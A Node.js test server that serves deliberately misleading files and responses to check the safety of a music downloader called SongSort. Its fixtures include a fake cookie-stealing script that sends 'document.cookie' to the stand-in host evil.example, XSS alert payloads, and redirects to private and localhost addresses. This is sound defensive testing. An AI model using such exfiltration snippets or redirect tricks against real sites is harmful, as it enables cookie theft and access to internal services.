// TEST ONLY: a local website that behaves badly on purpose, to test SongSort's downloader.
// Serves at http://127.0.0.1:5199. Never used by the real app.
import { createServer } from 'node:http';
import { mkdirSync, readFileSync, writeFileSync, existsSync } from 'node:fs';
import { dirname, join } from 'node:path';
import { fileURLToPath } from 'node:url';

const PORT = 5199;
const dir = join(dirname(fileURLToPath(import.meta.url)), '..', 'test-fixtures');
mkdirSync(dir, { recursive: true });

/* ---------- generated test files ---------- */
function id3(tags) {
  const frames = [];
  for (const [id, value] of Object.entries(tags)) {
    const text = Buffer.concat([Buffer.from([0]), Buffer.from(value, 'latin1')]);
    const head = Buffer.alloc(10);
    head.write(id, 0, 'ascii');
    head.writeUInt32BE(text.length, 4);
    frames.push(head, text);
  }
  const body = Buffer.concat(frames);
  const s = body.length;
  return Buffer.concat([Buffer.from([0x49, 0x44, 0x33, 3, 0, 0, (s >> 21) & 0x7f, (s >> 14) & 0x7f, (s >> 7) & 0x7f, s & 0x7f]), body]);
}
function mp3Frames(count) {
  const frame = Buffer.alloc(417); // MPEG-1 Layer III, 128 kbps, 44.1 kHz
  frame[0] = 0xff; frame[1] = 0xfb; frame[2] = 0x90; frame[3] = 0x64;
  return Buffer.concat(Array.from({ length: count }, () => frame));
}
function mp3(seconds, tags) {
  return Buffer.concat([id3(tags), mp3Frames(Math.round((seconds * 44100) / 1152))]);
}
function wav(seconds, freq) {
  const rate = 44100, ch = 2, n = Math.round(seconds * rate);
  const data = Buffer.alloc(n * ch * 2);
  for (let i = 0; i < n; i++) {
    const v = Math.round(Math.sin((2 * Math.PI * freq * i) / rate) * 0.3 * 32767);
    data.writeInt16LE(v, i * 4); data.writeInt16LE(v, i * 4 + 2);
  }
  const h = Buffer.alloc(44);
  h.write('RIFF', 0); h.writeUInt32LE(36 + data.length, 4); h.write('WAVEfmt ', 8); h.writeUInt32LE(16, 16);
  h.writeUInt16LE(1, 20); h.writeUInt16LE(ch, 22); h.writeUInt32LE(rate, 24); h.writeUInt32LE(rate * ch * 2, 28);
  h.writeUInt16LE(ch * 2, 32); h.writeUInt16LE(16, 34); h.write('data', 36); h.writeUInt32LE(data.length, 40);
  return Buffer.concat([h, data]);
}

const files = {
  'test-song.mp3': mp3(12, { TIT2: 'Fixture Song', TPE1: 'Fixture Band', TALB: 'Fixture Album' }),
  'test-tone.wav': wav(6, 440),
  // misleading extension: real WAV audio named .mp3
  'really-a-wav.mp3': wav(3, 523),
  // Windows program renamed as MP3 (harmless: just the header shape of an .exe)
  'setup.mp3': Buffer.concat([Buffer.from('MZ'), Buffer.alloc(62), Buffer.from('This program cannot be run in DOS mode.'), Buffer.alloc(2000)]),
  // web page renamed as MP3
  'page.mp3': Buffer.from('<!doctype html><html><head><title>Totally a song</title><script>alert("x")</script></head><body>Download now!</body></html>'),
  // SVG with a script, renamed as MP3
  'image.mp3': Buffer.from('<?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>'),
  // ZIP archive renamed as MP3
  'archive.mp3': Buffer.concat([Buffer.from('PK\x03\x04'), Buffer.alloc(500)]),
  // JavaScript renamed as MP3
  'script.mp3': Buffer.from('function steal(){ fetch("https://evil.example/" + document.cookie) }\nsteal();\n'.repeat(20)),
  // corrupted: valid ID3 tag followed by garbage
  'corrupt.mp3': Buffer.concat([id3({ TIT2: 'Broken' }), Buffer.from(Array.from({ length: 300000 }, (_, i) => (i * 7919 + 13) % 251))]),
  // truncated: first 20% of a real MP3 is fine, but the WAV header claims more audio than is present
  'truncated.wav': wav(4, 330).subarray(0, 60000),
  // mostly garbage after a few good frames (passes the first-bytes check, fails the middle check)
  'half-garbage.mp3': Buffer.concat([mp3Frames(60), Buffer.from(Array.from({ length: 900000 }, (_, i) => (i * 31 + 7) % 256))]),
};
for (const [name, buf] of Object.entries(files)) writeFileSync(join(dir, name), buf);

const PAGE = `<!doctype html><html><head><title>Fixture Band – Free downloads</title></head><body>
<h1>Fixture Band</h1><p>Our songs are free to download.</p>
<ul>
<li><a href="/files/test-song.mp3">Fixture Song (MP3)</a></li>
<li><a href="/files/test-tone.wav" download>Test Tone (WAV)</a></li>
<li><a href="javascript:alert(1)">bad link.mp3</a></li>
<li><a href="https://10.0.0.5/private.mp3">private.mp3</a></li>
</ul><audio src="/files/test-song.mp3"></audio></body></html>`;

const TYPES = { mp3: 'audio/mpeg', wav: 'audio/wav', m4a: 'audio/mp4', aac: 'audio/aac', flac: 'audio/flac', ogg: 'audio/ogg', html: 'text/html' };

createServer((req, res) => {
  const url = new URL(req.url, `http://127.0.0.1:${PORT}`);
  const p = decodeURIComponent(url.pathname);
  const cors = () => res.setHeader('Access-Control-Allow-Origin', '*');

  if (req.method === 'POST' && p.startsWith('/upload/')) {
    const name = p.slice(8);
    if (!/^[\w. ()-]+$/.test(name)) return res.writeHead(400).end();
    const chunks = [];
    req.on('data', (c) => chunks.push(c));
    req.on('end', () => {
      writeFileSync(join(dir, name), Buffer.concat(chunks));
      cors();
      res.end('ok');
    });
    return;
  }
  if (req.method === 'OPTIONS') {
    cors();
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST');
    return res.writeHead(204).end();
  }

  const serveFile = (name, withCors) => {
    const f = join(dir, name);
    if (!/^[\w. ()-]+$/.test(name) || !existsSync(f)) return res.writeHead(404).end('not found');
    const buf = readFileSync(f);
    if (withCors) cors();
    res.writeHead(200, { 'Content-Type': TYPES[name.split('.').pop()] ?? 'application/octet-stream', 'Content-Length': buf.length });
    res.end(buf);
  };

  if (p.startsWith('/files/')) return serveFile(p.slice(7), true);
  if (p.startsWith('/nocors/')) return serveFile(p.slice(8), false);
  if (p === '/page.html') {
    cors();
    return res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' }).end(PAGE);
  }
  if (p === '/no-audio-page.html') {
    cors();
    return res.writeHead(200, { 'Content-Type': 'text/html' }).end('<html><title>Blog</title><body><a href="/about">About</a></body></html>');
  }
  if (p.startsWith('/drop/')) {
    // network interruption: promise the whole file, send half, then cut the connection
    const f = join(dir, p.slice(6));
    if (!existsSync(f)) return res.writeHead(404).end();
    const buf = readFileSync(f);
    cors();
    res.writeHead(200, { 'Content-Type': 'audio/mpeg', 'Content-Length': buf.length });
    res.write(buf.subarray(0, Math.floor(buf.length / 2)));
    setTimeout(() => res.socket.destroy(), 300);
    return;
  }
  if (p === '/huge-declared.mp3') {
    cors();
    res.writeHead(200, { 'Content-Type': 'audio/mpeg', 'Content-Length': String(300 * 1024 * 1024) });
    res.write(mp3Frames(200));
    setTimeout(() => res.socket.destroy(), 5000);
    return;
  }
  if (p === '/huge-stream.mp3') {
    // no size given in advance; keeps sending real MP3 frames past SongSort's 250 MB limit
    cors();
    res.writeHead(200, { 'Content-Type': 'audio/mpeg' });
    const chunk = mp3Frames(2500); // ~1 MB
    let sent = 0;
    const pump = () => {
      while (sent < 270 * 1024 * 1024) {
        sent += chunk.length;
        if (!res.write(chunk)) return res.once('drain', pump);
      }
      res.end();
    };
    res.on('close', () => { sent = Infinity; });
    pump();
    return;
  }
  if (p === '/redirect-private.mp3') return res.writeHead(302, { Location: 'https://10.0.0.5/song.mp3', 'Access-Control-Allow-Origin': '*' }).end();
  if (p === '/redirect-local.mp3') return res.writeHead(302, { Location: 'http://127.0.0.1:5178/api/health', 'Access-Control-Allow-Origin': '*' }).end();
  if (p === '/redirect-ok.mp3') return res.writeHead(302, { Location: `http://127.0.0.1:${PORT}/files/test-song.mp3`, 'Access-Control-Allow-Origin': '*' }).end();
  if (p === '/html-typed.mp3') {
    cors();
    return res.writeHead(200, { 'Content-Type': 'text/html' }).end(readFileSync(join(dir, 'test-song.mp3')));
  }
  res.writeHead(404).end('not found');
}).listen(PORT, '127.0.0.1', () => console.log(`Test fixtures at http://127.0.0.1:${PORT}`));
